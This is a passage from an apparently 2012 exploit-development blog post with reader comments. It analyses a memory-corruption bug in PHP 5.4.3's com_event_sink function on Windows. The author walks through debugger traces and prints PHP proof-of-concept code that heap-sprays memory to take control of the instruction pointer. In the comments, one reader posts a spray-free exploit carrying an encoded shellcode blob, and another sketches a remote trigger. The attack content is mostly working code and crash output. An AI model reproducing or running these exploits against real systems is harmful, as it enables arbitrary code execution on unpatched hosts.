cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\wamp\bin\php\php5.4.3\php5ts.dll - 
php5ts!php_strftime+0xadc:

102f59bd 8b06            mov     eax,dword ptr [esi]  ds:0023:43434343=????????  
102f59bf 8d4dd4          lea     ecx,[ebp-2Ch]
102f59c2 51              push    ecx
102f59c3 53              push    ebx
102f59c4 53              push    ebx
102f59c5 56              push    esi
102f59c6 ff5010          call    dword ptr [eax+10h]</pre>
</div>Cool we control ESI fully and instruction crashes since Mov to EAX fails since ESI point to an Invalide Address <br />
<br />
----&gt; mov     eax,dword ptr [esi] ds:0023:43434343=????????  <br />
<br />
And EDI holds third argument , enough to hold some shellcode.<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:96px;">0:000&gt; d edi
0114d9f8  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
0114da08  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
0114da18  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
0114da28  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
0114da38  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB</pre>
</div><br />
<b><u>Code Execution [Exploitation]: </u></b><br />
<br />
*) We control ESI and there by could take control over EAX ,<br />
*) if we put ESI with a valid address and fill that memory with an arbitary mem adress then EAX would be in our hands.<br />
*) And at 102f59c6  call    dword ptr [eax+10h] , we can easily control EIP , since we control EAX and there by could make the call land any where we want [voila] .<br />
*)So we need to spray with two different values one value for Controlling EAX and guiding [CALL] instruction to  a valid adress space and another to control [EIP] and get complete control over the program. <br />
<br />
In short :<br />
<br />
$EIP=&quot;AAAA&quot;; //JMP EDI<br />
$EAX=&quot;BBBB &quot; -10h;<br />
$spray = $EIP.$EAX;<br />
<br />
<br />
1) Do some spray take control of EAX .<br />
2) Make the adress [Adress -10h ] since it's CALL EAX+10h.<br />
3) So fill ESI memory with &quot;\x34\x43\x42\x41&quot;<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:372px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br />&nbsp;<br /><br />$spray&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">str_repeat</span><span style="color: #007700">(</span><span style="color: #DD0000">"\x34\x43\x42\x41"</span><span style="color: #007700">,</span><span style="color: #0000BB">0x100</span><span style="color: #007700">);<br /></span><span style="color: #FF8000">//We&nbsp;wann&nbsp;make&nbsp;EAX&nbsp;=&nbsp;41424343&nbsp;so&nbsp;l-india.&nbsp;<br /></span><span style="color: #007700">echo&nbsp;</span><span style="color: #0000BB">strlen</span><span style="color: #007700">(</span><span style="color: #0000BB">$spray</span><span style="color: #007700">);<br /><br /><br /></span><span style="color: #0000BB">$deodrant</span><span style="color: #007700">=</span><span style="color: #DD0000">""</span><span style="color: #007700">;<br />for(</span><span style="color: #0000BB">$i</span><span style="color: #007700">=</span><span style="color: #0000BB">0</span><span style="color: #007700">;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">0x4b00</span><span style="color: #007700">;</span><span style="color: #0000BB">$i</span><span style="color: #007700">++)<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$deodrant</span><span style="color: #007700">.=</span><span style="color: #0000BB">$spray</span><span style="color: #007700">;<br />}<br /><br /><br /></span><span style="color: #0000BB">$terminate&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">"T"</span><span style="color: #007700">;<br /><br /></span><span style="color: #0000BB">$u</span><span style="color: #007700">&#91;&#93;&nbsp;=</span><span style="color: #0000BB">$deodrant</span><span style="color: #007700">;<br /><br /></span><span style="color: #0000BB">$r</span><span style="color: #007700">&#91;&#93;&nbsp;=</span><span style="color: #0000BB">$deodrant</span><span style="color: #007700">.</span><span style="color: #0000BB">$terminate</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">$a</span><span style="color: #007700">&#91;&#93;&nbsp;=</span><span style="color: #0000BB">$deodrant</span><span style="color: #007700">.</span><span style="color: #0000BB">$terminate</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">$s</span><span style="color: #007700">&#91;&#93;&nbsp;=</span><span style="color: #0000BB">$deodrant</span><span style="color: #007700">.</span><span style="color: #0000BB">$terminate</span><span style="color: #007700">;<br /><br />&nbsp;<br /></span><span style="color: #0000BB">$vVar&nbsp;</span><span style="color: #007700">=&nbsp;new&nbsp;</span><span style="color: #0000BB">VARIANT</span><span style="color: #007700">(</span><span style="color: #0000BB">0x048d0000</span><span style="color: #007700">+</span><span style="color: #0000BB">180</span><span style="color: #007700">);&nbsp;&nbsp;&nbsp;</span><span style="color: #FF8000">//We&nbsp;control&nbsp;this<br />//$buffer&nbsp;=&nbsp;str_repeat("B",200);<br /></span><span style="color: #0000BB">$buffer&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">"\x41\x42\x43\x44\x90\x90\x90\x90\xcc\xcc\xcc\xcc\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">$var2&nbsp;</span><span style="color: #007700">=&nbsp;new&nbsp;</span><span style="color: #0000BB">VARIANT</span><span style="color: #007700">(</span><span style="color: #0000BB">0x41414242</span><span style="color: #007700">);<br /><br /></span><span style="color: #0000BB">com_event_sink</span><span style="color: #007700">(</span><span style="color: #0000BB">$vVar</span><span style="color: #007700">,</span><span style="color: #0000BB">$var2</span><span style="color: #007700">,</span><span style="color: #0000BB">$buffer</span><span style="color: #007700">);<br /><br /><br /><br />&nbsp;<br /></span><span style="color: #0000BB">?&gt;</span>
</span>
</code></code></div>
</div><div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:192px;">(1fc.b7c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=41424334 ebx=00000000 ecx=00c1f9b0 edx=0114dbf0 esi=048d00b4 edi=0114dc48
eip=102f59c6 esp=00c1f978 ebp=00c1f9dc iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\wamp\bin\php\php5.4.3\php5ts.dll - 
php5ts!php_strftime+0xae5:

102f59c2 51              push    ecx
102f59c3 53              push    ebx
102f59c4 53              push    ebx
102f59c5 56              push    esi
102f59c6 ff5010          call    dword ptr [eax+10h]  ds:0023:41424344=????????</pre>
</div>Now spray with two different values one value for Controlling EAX and guiding [CALL] instruction to  a valid adress space and another to control [EIP] and get complete control over the program. <br />
<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:372px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br />&nbsp;<br />$eip&nbsp;</span><span style="color: #007700">=</span><span style="color: #DD0000">"\x44\x43\x42\x41"</span><span style="color: #007700">;<br /></span><span style="color: #FF8000">//$eip=&nbsp;"\x4b\xe8\x57\x78";&nbsp;jmp&nbsp;edi<br /></span><span style="color: #0000BB">$eax&nbsp;</span><span style="color: #007700">=</span><span style="color: #DD0000">"\x80\x01\x8d\x04"</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">$deodrant</span><span style="color: #007700">=</span><span style="color: #DD0000">""</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">$axespray&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">str_repeat</span><span style="color: #007700">(</span><span style="color: #0000BB">$eip</span><span style="color: #007700">.</span><span style="color: #0000BB">$eax</span><span style="color: #007700">,</span><span style="color: #0000BB">0x80</span><span style="color: #007700">);<br /><br /></span><span style="color: #FF8000">//048d0190<br /></span><span style="color: #007700">echo&nbsp;</span><span style="color: #0000BB">strlen</span><span style="color: #007700">(</span><span style="color: #0000BB">$axespray</span><span style="color: #007700">);<br /><br /><br /></span><span style="color: #FF8000">//19200&nbsp;==4B32&nbsp;4b00<br /></span><span style="color: #007700">for(</span><span style="color: #0000BB">$axeeffect</span><span style="color: #007700">=</span><span style="color: #0000BB">0</span><span style="color: #007700">;</span><span style="color: #0000BB">$axeeffect</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">0x4B32</span><span style="color: #007700">;</span><span style="color: #0000BB">$axeeffect</span><span style="color: #007700">++)<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$deodrant</span><span style="color: #007700">.=</span><span style="color: #0000BB">$axespray</span><span style="color: #007700">;<br />}<br /><br /><br /></span><span style="color: #0000BB">$terminate&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">"T"</span><span style="color: #007700">;<br /><br /></span><span style="color: #0000BB">$u</span><span style="color: #007700">&#91;&#93;&nbsp;=</span><span style="color: #0000BB">$deodrant</span><span style="color: #007700">;<br /><br /></span><span style="color: #0000BB">$r</span><span style="color: #007700">&#91;&#93;&nbsp;=</span><span style="color: #0000BB">$deodrant</span><span style="color: #007700">.</span><span style="color: #0000BB">$terminate</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">$a</span><span style="color: #007700">&#91;&#93;&nbsp;=</span><span style="color: #0000BB">$deodrant</span><span style="color: #007700">.</span><span style="color: #0000BB">$terminate</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">$s</span><span style="color: #007700">&#91;&#93;&nbsp;=</span><span style="color: #0000BB">$deodrant</span><span style="color: #007700">.</span><span style="color: #0000BB">$terminate</span><span style="color: #007700">;<br /><br />&nbsp;<br /></span><span style="color: #0000BB">$vVar&nbsp;</span><span style="color: #007700">=&nbsp;new&nbsp;</span><span style="color: #0000BB">VARIANT</span><span style="color: #007700">(</span><span style="color: #0000BB">0x048d0000</span><span style="color: #007700">+</span><span style="color: #0000BB">180</span><span style="color: #007700">);&nbsp;<br /></span><span style="color: #0000BB">$buffer&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">"\x90\x90\x90\x90\xcc\xcc\xcc\xcc\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">$var2&nbsp;</span><span style="color: #007700">=&nbsp;new&nbsp;</span><span style="color: #0000BB">VARIANT</span><span style="color: #007700">(</span><span style="color: #0000BB">0x41414242</span><span style="color: #007700">);<br /><br /></span><span style="color: #0000BB">com_event_sink</span><span style="color: #007700">(</span><span style="color: #0000BB">$vVar</span><span style="color: #007700">,</span><span style="color: #0000BB">$var2</span><span style="color: #007700">,</span><span style="color: #0000BB">$buffer</span><span style="color: #007700">);<br /><br /><br /><br />&nbsp;<br /></span><span style="color: #0000BB">?&gt;</span>
</span>
</code></code></div>
</div>And Voila EIP =&quot;woot woot&quot; <br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:108px;">(cb0.7d4): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=048d0180 ebx=00000000 ecx=00c1f9b0 edx=0114dbc8 esi=048d00b4 edi=0114dc20
eip=41414141 esp=00c1f974 ebp=00c1f9dc iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
41414141 ??              ???</pre>
</div>Now you know it's pretty easy , and you know where the shellcode is and things are pretty obvious. <br />
<br />
&gt; !load byakugan<br />
&gt;!jutsu searchOpcode jmp edi <br />
<br />
Code with a simple &quot;Message Box &quot; shellcode form our friend <a href="../external.html?link=http://www.shell-storm.org/shellcode/files/shellcode-526.php" target="_blank">Atul </a><br />
<br />
<img src="attachmentcf01.jpg?attachmentid=480&amp;d=1345467893" border="0" alt="Name:  phpexp.JPG
Views: 3996
Size:  46.0 KB"  style="float: CONFIG" /><br />
<br />
Next Part of the Blog Would be on the Remote PHP Exploits, might have to wait a long time till things get patched up.<br />
<br />
I have build a Fully Functional  Exploit with DEP Bypass, am not putting it here [even though it's pretty obvious on how to form this post]. But who ever wan't to play with it for learning purposes I could share it.<br />
<br />
Rashid Bhat has produced a Windows all platforms reliable exploit for this bug. <br />
<br />
<a href="../external.html?link=http://www.garage4hackers.com/blogs/3489/reliable-php-exploitation-windows-xp-windows-7-578/" target="_blank">http://www.garage4hackers.com/blogs/...windows-7-578/</a>

					
				</blockquote>
			</div>
				


				<div class="blogcontrol fly">
					
				</div>

				<div class="blogmeta">
					

					
					<div class="tags" id="blogtagcontainer_394">
							Tags:
							<span id="blogtaglist_394">
								
								<a href="blog622b.html?u=8&amp;tag=php+5.4.3+exploit">php 5.4.3 exploit</a>, 
	

	
		<a href="blog5d55.html?u=8&amp;tag=php+exploit">php exploit</a>
								
							</span>
							
								<span id="blogtagmenu_394"><a href="threadtagc02c.html?do=manage&amp;contenttype=vBBlog_BlogEntry&amp;contentid=394"><img src="images/misc/blog/tag_edit.html" border="0" class="inlineimg" id="blogtag_394" alt="Add / Edit Tags" /></a></span>
							
					</div>
					
				
					
					<dl class="blogcategory stats">
						<dt class="shade">Categories</dt>
						<dd>

	
		<a href="blog71e7.html?u=8&amp;blogcategoryid=-1">Uncategorized</a>
	
</dd>
					</dl>
					
				</div>
				<ul class="entrycontrols">
					
					
					
					
					
				</ul>

		</div>
	</div>

</div>

<div id="navlinks">
	<!-- top navlinks -->
	
		&laquo; <a href="blog6933.html?b=394&amp;goto=prev">Prev</a>
		&nbsp;&nbsp;&nbsp;
	
	<a href="bloge81f.html?u=8">Main</a>
		
			&nbsp;&nbsp;&nbsp;
			<a href="bloga217.html?b=394&amp;goto=next">Next</a> &raquo;
		
	<!-- end top navlinks -->
</div>




<!-- lightbox scripts -->
	<script type="text/javascript" src="clientscript/vbulletin_lightbox6719.html?v=421"></script>
	<script type="text/javascript">
	<!--
	vBulletin.register_control("vB_Lightbox_Container", "entry394", 1);
	//-->
	</script>
<!-- / lightbox scripts -->




<h2 id="comments_heading" class="commentsheader"><a name="comments"></a>Comments</h2>

<div id="above_comments" class="floatcontainer">
	
	
		
</div>

<form action="../external.html?link=http://garage4hackers.com/blog_inlinemod.php?b=394" method="post" id="commentform" class="block">
	
	<ol id="message_list" class="list_no_decoration">
		<li class="postbit postbit-lite postcontainer " id="comment_448">
	<a name="comment448"></a>
	
		
			
				<a href="member0612.html?u=16" class="avatarlink"><img src="Koalae533.jpg?u=16&amp;dateline=1317119947&amp;type=thumb" alt="41.w4r10r's Avatar"/></a>
			
		
	
	
	
	<div class="commenthead">
	<div class="postbithead">
		<label for="comment_imod_checkbox_448">
		
			<a href="member0612.html?u=16" class="username">41.w4r10r</a>
		
		-
		<span class="postdate">08-20-2012 <span class="time">07:31 PM</span></span>
		</label>
	
	<div class="postbitfoot floatcontainer">
		<ul class="postcontrols">
			
			
			
		</ul>
	</div>
	</div>
	</div>
	<div class="content">
		<div id="comment_text_448">
			<blockquote class="posttext restore">
				waiting for RCE blog....<br />
anyways you can PM me RCE sploit :P
			</blockquote>
		</div>
		<div class="commentfoot floatcontainer">
			
		</div>
	</div>
	
	
	<script type="text/javascript">
	<!--
	vBulletin.register_control("vB_QuickEdit", "448");
	//-->
	</script>
</li><li class="postbit postbit-lite postcontainer " id="comment_449">
	<a name="comment449"></a>
	
		
			
				<a href="member5665.html?u=238" class="avatarlink"><img src="sss836c.png?u=238&amp;dateline=1333021046&amp;type=thumb" alt="[s]'s Avatar"/></a>
			
		
	
	
	
	<div class="commenthead">
	<div class="postbithead">
		<label for="comment_imod_checkbox_449">
		
			<a href="member5665.html?u=238" class="username">[s]</a>
		
		-
		<span class="postdate">08-20-2012 <span class="time">08:08 PM</span></span>
		</label>
	
	<div class="postbitfoot floatcontainer">
		<ul class="postcontrols">
			
			
			
		</ul>
	</div>
	</div>
	</div>
	<div class="content">
		<div id="comment_text_449">
			<blockquote class="posttext restore">
				Hi , its look good one <img src="images/smilies/smile.html" border="0" alt="" title="Smile" class="inlineimg" /> <br />
In my case it is getting Ddosed ! Application getting crashed .. In my system stack is starting from 0x021F2351 and tried put some garbage on the stack so that ECX can be 0x41414141. <br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:72px;">$EAX   = 0x021F2351;            
$stack = str_repeat(&quot;x41&quot;, 0x1000000); 
 class w00t { }
com_event_sink(new Variant($EAX), new w00t(), array());</pre>
</div>For remote i think this will work ! <br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:72px;">$ie-&gt;Visible = true; 
$ie-&gt;Navigate($_post['anyvar']); 
while(!$sink-&gt;terminated) { 
com_message_pump(4000);</pre>
</div>PS:Remote is Not tested *
			</blockquote>
		</div>
		<div class="commentfoot floatcontainer">
			
		</div>
	</div>
	
	
	<script type="text/javascript">
	<!--
	vBulletin.register_control("vB_QuickEdit", "449");
	//-->
	</script>
</li><li class="postbit postbit-lite postcontainer " id="comment_450">
	<a name="comment450"></a>
	
		
			
				<a href="membere81f.html?u=8" class="avatarlink"><img src="20130721_1819593501.jpg?u=8&amp;dateline=1400680840&amp;type=thumb" alt="fb1h2s's Avatar"/></a>
			
		
	
	
	
	<div class="commenthead">
	<div class="postbithead">
		<label for="comment_imod_checkbox_450">
		
			<a href="membere81f.html?u=8" class="username">fb1h2s</a>
		
		-
		<span class="postdate">08-20-2012 <span class="time">08:29 PM</span></span>
		</label>
	
	<div class="postbitfoot floatcontainer">
		<ul class="postcontrols">
			
			
			
		</ul>
	</div>
	</div>
	</div>
	<div class="content">
		<div id="comment_text_450">
			<blockquote class="posttext restore">
				I tested it only on Win Xp sp2 . Others it would vary
			</blockquote>
		</div>
		<div class="commentfoot floatcontainer">
			
		</div>
	</div>
	
	
	<script type="text/javascript">
	<!--
	vBulletin.register_control("vB_QuickEdit", "450");
	//-->
	</script>
</li><li class="postbit postbit-lite postcontainer " id="comment_451">
	<a name="comment451"></a>
	
		
			
				<a href="member5665.html?u=238" class="avatarlink"><img src="sss836c.png?u=238&amp;dateline=1333021046&amp;type=thumb" alt="[s]'s Avatar"/></a>
			
		
	
	
	
	<div class="commenthead">
	<div class="postbithead">
		<label for="comment_imod_checkbox_451">
		
			<a href="member5665.html?u=238" class="username">[s]</a>
		
		-
		<span class="postdate">08-20-2012 <span class="time">09:04 PM</span></span>
		</label>
	
	<div class="postbitfoot floatcontainer">
		<ul class="postcontrols">
			
			
			
		</ul>
	</div>
	</div>
	</div>
	<div class="content">
		<div id="comment_text_451">
			<blockquote class="posttext restore">
				got ddosed on the following version ! <br />
<br />
PHP 5.3.8  + Windows XP SP3 Professional PL
			</blockquote>
		</div>
		<div class="commentfoot floatcontainer">
			
		</div>
	</div>
	
	
	<script type="text/javascript">
	<!--
	vBulletin.register_control("vB_QuickEdit", "451");
	//-->
	</script>
</li><li class="postbit postbit-lite postcontainer " id="comment_452">
	<a name="comment452"></a>
	
		
			
				<a href="membere81f.html?u=8" class="avatarlink"><img src="20130721_1819593501.jpg?u=8&amp;dateline=1400680840&amp;type=thumb" alt="fb1h2s's Avatar"/></a>
			
		
	
	
	
	<div class="commenthead">
	<div class="postbithead">
		<label for="comment_imod_checkbox_452">
		
			<a href="membere81f.html?u=8" class="username">fb1h2s</a>
		
		-
		<span class="postdate">08-20-2012 <span class="time">10:39 PM</span></span>
		</label>
	
	<div class="postbitfoot floatcontainer">
		<ul class="postcontrols">
			
			
			
		</ul>
	</div>
	</div>
	</div>
	<div class="content">
		<div id="comment_text_452">
			<blockquote class="posttext restore">
				@[S] here I haven't provided the exploit yet right, all you have here is the Analysis . A
			</blockquote>
		</div>
		<div class="commentfoot floatcontainer">
			
		</div>
	</div>
	
	
	<script type="text/javascript">
	<!--
	vBulletin.register_control("vB_QuickEdit", "452");
	//-->
	</script>
</li><li class="postbit postbit-lite postcontainer " id="comment_453">
	<a name="comment453"></a>
	
		
			
				<a href="memberb54b.html?u=842" class="avatarlink"><img src="images/misc/unknown.html" alt="amutu's Avatar" /></a>
			
		
	
	
	
	<div class="commenthead">
	<div class="postbithead">
		<label for="comment_imod_checkbox_453">
		
			<a href="memberb54b.html?u=842" class="username">amutu</a>
		
		-
		<span class="postdate">08-21-2012 <span class="time">05:52 PM</span></span>
		</label>
	
	<div class="postbitfoot floatcontainer">
		<ul class="postcontrols">
			
			
			
		</ul>
	</div>
	</div>
	</div>
	<div class="content">
		<div id="comment_text_453">
			<blockquote class="posttext restore">
				congratz for the excellent post! I'm interested in php internals also! perhaps you can help me explaining some stuff 'cause i'm having some problems....i can't wait to read your php presentation from cocon!<br />
btw, you've managed to re-create the exploit for 5.3.9? or the RCE in 5.2? I'm working on that stuff...mostly 5.3.9<br />
<br />
<br />
ps: where can i download your paper from? can't find it on the cOcOn website.
			</blockquote>
		</div>
		<div class="commentfoot floatcontainer">
			
				<span class="shade">Updated 08-21-2012 at 05:56 PM by</span> <a href="memberb54b.html?u=842">amutu</a>
				
			
		</div>
	</div>
	
	
	<script type="text/javascript">
	<!--
	vBulletin.register_control("vB_QuickEdit", "453");
	//-->
	</script>
</li><li class="postbit postbit-lite postcontainer " id="comment_611">
	<a name="comment611"></a>
	
		
			
				<a href="member4258.html?u=3489" class="avatarlink"><img src="550813_10151201455682497_370701521_nc1ce.jpg?u=3489&amp;dateline=1354339669&amp;type=thumb" alt="Rashid bhatt's Avatar"/></a>
			
		
	
	
	
	<div class="commenthead">
	<div class="postbithead">
		<label for="comment_imod_checkbox_611">
		
			<a href="member4258.html?u=3489" class="username">Rashid bhatt</a>
		
		-
		<span class="postdate">12-01-2012 <span class="time">10:55 AM</span></span>
		</label>
	
	<div class="postbitfoot floatcontainer">
		<ul class="postcontrols">
			
			
			
		</ul>
	</div>
	</div>
	</div>
	<div class="content">
		<div id="comment_text_611">
			<blockquote class="posttext restore">
				Hello<br />
<br />
If you are not bypassing ASLR &amp; DEP why do we need to spray?<br />
<br />
<img src="../external.html?link=http://imageshack.com/e/p5aMES7Yj" border="0" alt="" /><br />
<br />
Cheers!
			</blockquote>
		</div>
		<div class="commentfoot floatcontainer">
			
		</div>
	</div>
	
	
	<script type="text/javascript">
	<!--
	vBulletin.register_control("vB_QuickEdit", "611");
	//-->
	</script>
</li><li class="postbit postbit-lite postcontainer " id="comment_612">
	<a name="comment612"></a>
	
		
			
				<a href="membere81f.html?u=8" class="avatarlink"><img src="20130721_1819593501.jpg?u=8&amp;dateline=1400680840&amp;type=thumb" alt="fb1h2s's Avatar"/></a>
			
		
	
	
	
	<div class="commenthead">
	<div class="postbithead">
		<label for="comment_imod_checkbox_612">
		
			<a href="membere81f.html?u=8" class="username">fb1h2s</a>
		
		-
		<span class="postdate">12-01-2012 <span class="time">11:33 AM</span></span>
		</label>
	
	<div class="postbitfoot floatcontainer">
		<ul class="postcontrols">
			
			
			
		</ul>
	</div>
	</div>
	</div>
	<div class="content">
		<div id="comment_text_612">
			<blockquote class="posttext restore">
				The poc was made for Winxp | 2003 environments. And I don't know why u asked that question ?. Any way the current scenario if u check the instruction it was necessary for a spray to attain code execution. <br />
<br />
Feel free to put up a poc with out spraying.<br />
<br />
Cheers.
			</blockquote>
		</div>
		<div class="commentfoot floatcontainer">
			
		</div>
	</div>
	
	
	<script type="text/javascript">
	<!--
	vBulletin.register_control("vB_QuickEdit", "612");
	//-->
	</script>
</li><li class="postbit postbit-lite postcontainer " id="comment_614">
	<a name="comment614"></a>
	
		
			
				<a href="member4258.html?u=3489" class="avatarlink"><img src="550813_10151201455682497_370701521_nc1ce.jpg?u=3489&amp;dateline=1354339669&amp;type=thumb" alt="Rashid bhatt's Avatar"/></a>
			
		
	
	
	
	<div class="commenthead">
	<div class="postbithead">
		<label for="comment_imod_checkbox_614">
		
			<a href="member4258.html?u=3489" class="username">Rashid bhatt</a>
		
		-
		<span class="postdate">12-01-2012 <span class="time">09:47 PM</span></span>
		</label>
	
	<div class="postbitfoot floatcontainer">
		<ul class="postcontrols">
			
			
			
		</ul>
	</div>
	</div>
	</div>
	<div class="content">
		<div id="comment_text_614">
			<blockquote class="posttext restore">
				@fbihs2<br />
hello  brother ,<br />
<br />
I think you got me wrong , when i said that  <i>&quot;you are not bypassing ASLR &amp; DEP&quot;</i> i knew that the exploit was not meant for environments other than winxp/2003, i thought why spraying was necessary when we can be precise in offsets,<br />
<br />
anyways here is the POC without spraying <br />
<br />
And listen bro i believe its quite possible that this vulnerability can be turned into a address disclosure bug!  We need to talk about it contact me .<br />
<i><br />
&lt;?php<br />
//$bu = str_repeat(&quot;B&quot;, 10); <br />
$buffer = &quot;\x10\xD4\x10\x01&quot;. &quot;aaaaaaaa&quot; . &quot;aaaa&quot; . &quot;\x24\xd4\x10\x01&quot; .&quot;\xfc\xbb\x9d\x12\x3c\x8d\xeb\x0c\x5e\x56\x31\x1e  \x  ad\x01\xc3&quot; .<br />
&quot;\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x44\xf9\  x  a7\x54\x02&quot; .<br />
&quot;\xda\x23\x57\x38\x90\xbb\xa9\x75\xb1\xc8\xbb\xb5\  x  b1\xb9\x37&quot; .<br />
&quot;\x3e\xb3\x59\xc3\x06\x34\xe9\xad\xa6\xcf\xdb\x69\  x  e9\xd7\x56&quot; .<br />
&quot;\x79\xac\xe6\x49\x82\xaf\x89\xe2\x11\x0b\x6e\x7e\  x  ac\x6f\xe5&quot; .<br />
&quot;\xd4\x07\xf7\xf8\x3e\xdc\x4d\xe3\x35\xb9\x71\x12\  x  a1\xdd\x45&quot; .<br />
&quot;\x5d\xbe\x16\x2e\x5c\x2e\x67\xcf\x6e\x6e\x74\x83\  x  15\xae\xf1&quot; .<br />
&quot;\xdc\xd4\xe0\xf7\xe3\x11\x15\xf3\xd8\xe1\xce\xd4\  x  6b\xfb\x84&quot; .<br />
&quot;\x7f\xb7\xfa\x71\x19\x3c\xf0\xce\x6d\x18\x15\xd0\  x  9a\x17\x21&quot; .<br />
&quot;\x59\x5d\xcf\xa3\x19\x7a\x13\xd5\x62\x30\x23\x3c\  x  b1\xbc\xd6&quot; .<br />
&quot;\xb7\xfb\xd7\x96\x86\xf5\xcb\xf4\xfe\x95\xeb\x07\  x  01\x20\x56&quot; .<br />
&quot;\xf3\x45\x4d\x81\x19\xca\x35\x2d\xf9\x7f\xd2\xc0\  x  fe\x7f\xdd&quot; .<br />
&quot;\x54\x45\x88\x4a\x0b\x29\xa8\xcb\xbb\x82\x9a\xe5\  x  5f\x8c\xaf&quot; .<br />
&quot;\x8a\xfa\x3e\xd8\x31\x21\xb4\x51\x2f\x7f\x37\x34\  x  b4\x09\x05&quot; .<br />
&quot;\xe7\x0f\xa1\x2b\x45\xcc\x35\x37\x72\x7e\xd2\x26\  x  85\x81\xdd&quot; .<br />
&quot;\xc0\x16\x06\x7a\x30\x81\x97\x1d\x55\x13\x30\xaf\  x  f0\xe0\xb3&quot; .<br />
&quot;\x1e\x21\x8e\x68\x45\xdf\x06\x73\xed\x87\x38\x54\  x  ce\x5f\x74&quot; .<br />
&quot;\xc7\x48\xbe\xee\x95\x3b\xad\xce\x31\xab\x01\x2f\  x  a4\x5b\x11&quot; .<br />
&quot;\x4a\x44\xf0\x90\x5d\x1c\x44\xf6\x4d\x94\xb4\xc7\  x  bf\xf4\x65&quot; .<br />
&quot;\x76\x12\x06\x59\x49\x52\xa8\xa5\xfc\x5a\x49\x5a\  x  fe\x5a\x49&quot; .<br />
&quot;\x5a&quot;;<br />
<br />
<br />
<br />
$vVar = new VARIANT(0x0110D410); // We controll this <br />
$vVar2 = new VARIANT(0xbadc0de); //  <br />
<br />
<br />
com_event_sink($vVar, $vVar2 , $buffer ); <br />
?&gt;<br />
</i><br />
<br />

